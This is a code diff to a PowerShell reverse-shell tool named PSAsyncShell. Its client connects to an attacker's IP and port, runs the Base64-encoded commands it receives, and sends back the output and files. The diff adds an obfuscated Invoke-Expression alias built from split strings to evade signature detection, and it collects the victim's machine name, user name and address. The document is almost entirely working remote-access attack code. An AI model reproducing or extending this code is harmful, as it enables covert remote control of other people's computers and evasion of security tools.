@@ -47,6 +47,8 @@ $IP = $args[1]
 $Port = $args[2]
 $Start = "True"
 $Chunk = $args[4]
+$Alias1 = "Invoke" ; $Alias2 = "Express"
+Set-Alias sh -value "$Alias1-$Alias2`ion"
 if ($OSVersion -like "*Win*") { $localslash = "\" } else { $localslash = "/" } 
 
 # Functions
@@ -92,7 +94,10 @@ elseif ($upload -eq "True") { $command = R64Decoder -t $command
 $downfile = $command.split()[1] ; $command = R64Encoder -f $downfile ; $upload = "False" }
 elseif ($Multi -eq "True") { $command = R64Encoder -t "[+] MultiPart Data OK!" }
 
-else { do { Write-Host -NoNewline "[PSAsyncShell] $path> " -ForegroundColor Blue ; $command = Read-Host
+else { do { $path = $path.replace("`n","").replace("`r","")
+Write-Host -NoNewline "[PSAsyncShell] $path> " -ForegroundColor Blue ; $command = $Host.UI.ReadLine()
+if ($command -like "session") { $command = '$clientdata | Format-Table -AutoSize' }
+if ($command -like "pwd") { if (!$path) { $Start = "True" }}
 
 if ($command -like "upload*") { $upload = "True" ; $upfile = $command.split()[2]
 if ($command -notlike "*$remoteslash*") { $command = "upload " + $command.split()[1] + " $path" + $remoteslash + $upfile }
@@ -150,11 +155,19 @@ if ($data) { Write-Host $data -ForegroundColor Yellow }
 $client.Close() ; $Listener.Stop()}}
 
 # ------------ Client Side ------------ #
+$ClientData = New-Object -TypeName psobject
+$ClientData | Add-Member -MemberType NoteProperty -Name Current -Value "*"
+$RandomID = (-join ((0x30..0x39)+(0x41..0x5A)+(0x61..0x7A) | Get-Random -Count 12  | % {[char]$_}))
+$ClientData | Add-Member -MemberType NoteProperty -Name ClientID -Value $RandomID
+$ClientData | Add-Member -MemberType NoteProperty -Name ComputerName -Value $([System.Environment]::MachineName.tolower())
+$ClientData | Add-Member -MemberType NoteProperty -Name UserName -Value $([System.Environment]::UserName.tolower())
+
 if ($args[0] -like "-c") { while ($true) { $cmd = $null ; $out = $null
 
 # Read command from server
 Start-Sleep -milliseconds 500
 $tcpConnection = New-Object System.Net.Sockets.TcpClient("$IP", "$Port")
+$ClientData | Add-Member -MemberType NoteProperty -Name Address -Value $($tcpconnection.client.localendpoint.address.ipaddresstostring)
 $tcpStream = $tcpConnection.GetStream()
 $reader = New-Object System.IO.StreamReader($tcpStream)
 $cmd = $reader.ReadLine()
@@ -163,6 +176,7 @@ if ($upload -eq "True") { R64Decoder -f $cmd $downfile }
 else { $cmd = R64Decoder -t $cmd }
 if ($cmd -eq "[+] PSAsyncShell OK!") { $Start = "True" }
 
+if ($args -like "*-debug") { Write-Host "CMD: $cmd" }
 $reader.Close() ; $tcpConnection.Close()
 
 # Run command & Send to server
@@ -179,12 +193,12 @@ elseif ($upload -eq "True") { $out = R64Encoder -t "[+] File uploaded!" ; $uploa
 elseif ($Start -eq "True") { $out = R64Encoder -t $pwd.Path ; $Start = "False" }
 elseif ($Multi -eq "True") { GetChunk $multiout | % { Start-Sleep -milliseconds 1200 ; SendChunk $_ ; SendChunk $_ } ; $Multi = "SendOut" }
 elseif ($Multi -eq "SendOut") { $out = R64Encoder -t "[+] MultiPart Data OK!" ; $Multi = "False" ; $multiout = $null }
-else { $out = (iex "$cmd") | Out-String
+else { $out = $(sh "$cmd") | Out-String
+if ($args -like "*-debug") { Write-Host "OUT: $out" }
 $out = R64Encoder -t $out }
 
 if ($Chunk) { if ($out.length -ge $Chunk) { $multiout = $out ; $Multi = "True"
 $out = R64Encoder -t "[+] Sending MultiPart Data.." }}
 
-if ($out) { $writer.WriteLine($out) }
+if ($out) { $writer.WriteLine($out) } else { $out = R64Encoder -t $pwd.Path }
 $writer.Close() ; $tcpConnection.Close()}}
-
